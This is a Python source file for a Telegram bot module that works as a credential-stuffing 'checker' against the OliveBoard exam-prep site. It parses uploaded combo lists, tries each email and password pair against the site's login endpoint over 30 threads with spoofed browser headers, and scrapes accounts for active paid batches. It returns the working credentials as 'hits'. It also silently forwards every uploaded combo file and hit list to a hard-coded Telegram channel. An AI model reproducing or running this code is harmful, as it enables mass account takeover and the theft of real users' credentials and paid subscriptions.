import requests
from bs4 import BeautifulSoup
import re
from datetime import datetime
import time
import os
import asyncio
import logging
from concurrent.futures import ThreadPoolExecutor
from telegram import Update
from telegram.ext import ContextTypes

# ✅ Logging level ERROR par hai taaki console mein koi bekar logs na dikhein
logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)

# ==============================================================================
# SMART PARSER
# ==============================================================================
def parse_combo(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    if '*' in line and ':' not in line:
        parts = line.rsplit('*', 1)
    else:
        parts = line.rsplit(':', 2)
    
    if len(parts) >= 2:
        password = parts[-1].strip()
        username = parts[-2].strip()
        
        if " " in username:
            username = username.split()[-1]
        if username.startswith('+91'):
            username = username[3:]
        if username.isdigit() and len(username) > 10:
            username = username[-10:]
        if username.lower().startswith(('http', 'android', 'com.', 'www.', 'mozilla', 'accept')):
            return None
            
        return username, password
    return None


class Checker:
    # ============ BOT CONFIG ============
    command = "olivee"
    name = "OliveBoard"
    # ====================================

    async def handle_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        context.user_data['awaiting_file_for'] = self.command
        await update.message.reply_text(
            f"📂 <b>{self.name} Ultra-Fast Checker Ready!</b>\n\n"
            f"Ab apna <code>combo.txt</code> file bhejo.\n"
            f"💡 <b>Smart Parse:</b> ':', '*', '+91', aur multiple formats auto-handle honge.\n"
            f"⚠️ <b>Strict Filter:</b> Sirf <b>ACTIVE (Non-Expired)</b> batches wale accounts HIT honge.\n"
            f"⚡ <b>No Proxy:</b> 30 Threads ke sath direct ultra-fast connection.\n"
            f"🛑 Beech mein rokna ho toh <code>/stop</code> type kar do.",
            parse_mode="HTML"
        )

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        progress_msg = await update.message.reply_text("⏳ File download kar raha hoon aur check start kar raha hoon...")
        
        file = await update.message.document.get_file()
        original_file_name = update.message.document.file_name or "combo.txt"
        temp_input_file = f"temp_input_{update.effective_user.id}_{int(time.time())}.txt"
        await file.download_to_drive(temp_input_file)
        
        with open(temp_input_file, 'r', encoding='utf-8-sig', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
            
        total = len(lines)
        if total == 0:
            await progress_msg.edit_text("❌ File khali hai ya valid nahi hai!")
            if os.path.exists(temp_input_file): os.remove(temp_input_file)
            return

        stats = {'checked': 0, 'hits': 0, 'failed': 0, 'hit_details': []}
        context.user_data[f'stats_{self.command}'] = stats
        context.user_data['stop_checking'] = False

        asyncio.create_task(self.run_checker(update, context, temp_input_file, original_file_name, lines, total, progress_msg))

    async def run_checker(self, update, context, temp_input_file, original_file_name, lines, total, progress_msg):
        max_workers = 30
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            chunk_size = 30
            
            for i in range(0, total, chunk_size):
                if context.user_data.get('stop_checking', False): break
                
                chunk = lines[i:i+chunk_size]
                futures = [executor.submit(self.check_single, line) for line in chunk]
                
                for future in futures:
                    if context.user_data.get('stop_checking', False): break
                    
                    result = future.result()
                    stats = context.user_data[f'stats_{self.command}']
                    stats['checked'] += 1
                    
                    if result['status'] == 'hit':
                        stats['hits'] += 1
                        stats['hit_details'].append(result['data'])
                    else:
                        stats['failed'] += 1
                
                if context.user_data.get('stop_checking', False): break
                
                stats = context.user_data[f'stats_{self.command}']
                progress_text = (
                    f"🔄 <b>{self.name} Checking...</b>\n\n"
                    f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
                    f"🔥 Active Hits: {stats['hits']}\n"
                    f"❌ Failed/No Batch: {stats['failed']}\n⏳ Remaining: {total - stats['checked']}"
                )
                try:
                    await progress_msg.edit_text(progress_text, parse_mode="HTML")
                except Exception:
                    pass
                
                await asyncio.sleep(0.1)

        # ============ FINAL CLEANUP & SUMMARY ============
        stats = context.user_data.get(f'stats_{self.command}', {'checked': 0, 'hits': 0, 'failed': 0, 'hit_details': []})
        is_stopped = context.user_data.get('stop_checking', False)
        
        context.user_data.pop('stop_checking', None)
        context.user_data.pop('awaiting_file_for', None)
        context.user_data.pop(f'stats_{self.command}', None)
        
        user_name = update.effective_user.username or f"User_{update.effective_user.id}"
        app_filename = f"{self.name}.txt"
        
        status_emoji = "🛑" if is_stopped else "🎉"
        status_text = "User dwara STOP kar diya gaya!" if is_stopped else "Checking Completed!"
        
        user_caption = (
            f"{status_emoji} {self.name} - {status_text}\n\n"
            f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
            f"🔥 Active Hits: {stats['hits']}\n❌ Failed/No Batch: {stats['failed']}"
        )
        
        log_original_caption = f"🎉 {self.name} Checker\n👤 User: @{user_name}"
        log_hits_caption = (
            f"👤 User: @{user_name}\n\n"
            f"{status_emoji} {self.name} - {status_text}\n\n"
            f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
            f"🔥 Active Hits: {stats['hits']}\n❌ Failed/No Batch: {stats['failed']}"
        )
        
        if stats['hits'] > 0:
            hits_temp_file = f"hits_temp_{update.effective_user.id}_{int(time.time())}.txt"
            with open(hits_temp_file, 'w', encoding='utf-8') as f:
                for hit in stats['hit_details']: 
                    f.write(hit + "\n")
            
            try:
                await progress_msg.delete()
            except Exception:
                pass
            
            await update.message.reply_document(
                document=open(hits_temp_file, 'rb'),
                filename=app_filename,
                caption=user_caption
            )
            
            try:
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(temp_input_file, 'rb'),
                    filename=app_filename,
                    caption=log_original_caption
                )
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(hits_temp_file, 'rb'),
                    filename=app_filename,
                    caption=log_hits_caption
                )
            except Exception as e:
                logger.error(f"Channel send error: {e}")
                
            if os.path.exists(hits_temp_file):
                os.remove(hits_temp_file)
        else:
            await progress_msg.edit_text(
                f"{user_caption}\n\n❌ Koi bhi Active Hit nahi mila.\n💡 <i>Check Heroku logs for exact failure reasons.</i>", 
                parse_mode="HTML"
            )
            
            try:
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(temp_input_file, 'rb'),
                    filename=app_filename,
                    caption=f"{log_original_caption}\n(0 Hits)"
                )
            except Exception as e:
                logger.error(f"Channel send error: {e}")

        if os.path.exists(temp_input_file):
            os.remove(temp_input_file)

    def check_single(self, line):
        parsed = parse_combo(line)
        if not parsed:
            return {'status': 'failed'}
        
        email, password = parsed

        login_url = "https://www.oliveboard.in/pyscripts/loginnext.php"
        home_url = "https://www.oliveboard.in/"
        validity_url = "https://www.oliveboard.in/myaccount/buypayu/validity.php"

        payload = {
            'lemail': email,
            'lpwd': password,
            'lpwd1': '1'
        }

        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.oliveboard.in',
            'Referer': 'https://www.oliveboard.in/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 16; Pixel 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Mobile Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
        }

        session = requests.Session()
        try:
            # Step 1: Initialize Session
            try:
                session.get(home_url, headers={'User-Agent': headers['User-Agent']}, timeout=10)
            except Exception as e:
                return {'status': 'failed'}
            
            # Step 2: Login Request
            try:
                response = session.post(login_url, data=payload, headers=headers, timeout=12)
            except Exception as e:
                return {'status': 'failed'}
            
            if response.status_code != 200:
                return {'status': 'failed'}
            
            is_success = False
            if "u1.oliveboard.in/exams" in response.text:
                is_success = True
            try:
                if response.json() == 1:
                    is_success = True
            except Exception:
                pass

            if not is_success:
                return {'status': 'failed'}
                
            # Step 3: Check Validity
            try:
                val_response = session.get(validity_url, headers={'User-Agent': headers['User-Agent']}, timeout=12)
            except Exception as e:
                return {'status': 'failed'}
                
            if val_response.status_code != 200:
                return {'status': 'failed'}
                
            soup = BeautifulSoup(val_response.text, 'html.parser')
            table = soup.find('table')
            
            if not table:
                return {'status': 'failed'}
                
            rows = table.find_all('tr')
            active_batches = []
            date_pattern = re.compile(r'(?:Jan(?:uary)?|Feb(?:ruary)?|Mar(?:ch)?|Apr(?:il)?|May|Jun(?:e)?|Jul(?:y)?|Aug(?:ust)?|Sep(?:tember)?|Oct(?:ober)?|Nov(?:ember)?|Dec(?:ember)?)\s+\d{1,2}(?:st|nd|rd|th)?,\s+\d{4}', re.IGNORECASE)

            for row in rows[1:]:  # Skip header
                cols = row.find_all('td')
                if len(cols) >= 4:
                    plan_name = cols[2].text.strip()
                    validity_text = cols[3].text.strip().replace('\n', ' ')
                    validity_text = re.sub(r'([a-zA-Z])(Access)', r'\1 \2', validity_text)
                    
                    is_exp = False
                    date_match = date_pattern.search(validity_text)
                    
                    if date_match:
                        date_str_found = date_match.group(0)
                        clean_date_str = re.sub(r'(\d+)(st|nd|rd|th)', r'\1', date_str_found, flags=re.IGNORECASE)
                        try:
                            end_date = datetime.strptime(clean_date_str, "%B %d, %Y")
                            if end_date < datetime.now():
                                is_exp = True
                        except ValueError:
                            pass
                    
                    # ✅ SIRF ACTIVE BATCHES KO HI LIST MEIN ADD KAREGA (EXP IGNORE)
                    if not is_exp:
                        active_batches.append({
                            "plan_name": plan_name,
                            "validity": validity_text
                        })
            
            if not active_batches:
                return {'status': 'failed'}
                
            # ✅ Format hit: Order ID hata diya gaya hai, sirf Plan Name aur Validity dikhegi
            hit_text = f"🔐 Details : {email}:{password}\n📚 Active Batches :\n"
            for idx, b in enumerate(active_batches, 1):
                hit_text += f"📖 {idx}. {b['plan_name']} - {b['validity']}\n"
            hit_text += "\n" + "-" * 60 + "\n"
            
            return {'status': 'hit', 'data': hit_text}
            
        except Exception as e:
            return {'status': 'failed'}
        finally:
            session.close()
